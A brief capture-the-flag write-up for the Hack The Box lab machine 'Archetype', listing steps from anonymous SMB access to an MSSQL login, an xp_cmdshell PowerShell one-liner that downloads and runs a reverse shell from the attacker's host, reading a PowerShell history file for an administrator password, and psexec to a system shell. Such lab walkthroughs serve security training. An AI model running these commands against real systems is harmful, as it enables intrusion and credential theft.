# Archetype

https://www.hackthebox.eu/home/start

## Writeup

1. Scan smb with `nmap`
2. Connect to anonymous SMB
3. Use `smbclient -N \\\\10.10.10.27\\backups` to get SQL password
4. Connect to SQL with `impacket-mssqlclient ARCHETYPE/sql_svc@10.10.10.27 -windows-auth` and enable `xp_cmdshell`
5. Host HTTP server on port 80 to host reverse shell `shell.ps1` with `python3 -m http.server 80`
6. Host netcat listener on port 443 with `ufw allow from 10.10.10.27 proto tcp to any port 80,443` and `nc -lvnp 443`
7. Use `xp_cmdshell` to run `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.65/shell.ps1\");"`
8. Switch back to netcat and get powershell creds from `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (`net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!` used previously)
9. Run `impacket-psexec administrator@10.10.10.27` with password `MEGACORP_4dm1n!!` to get root powershell.
10. Syrup?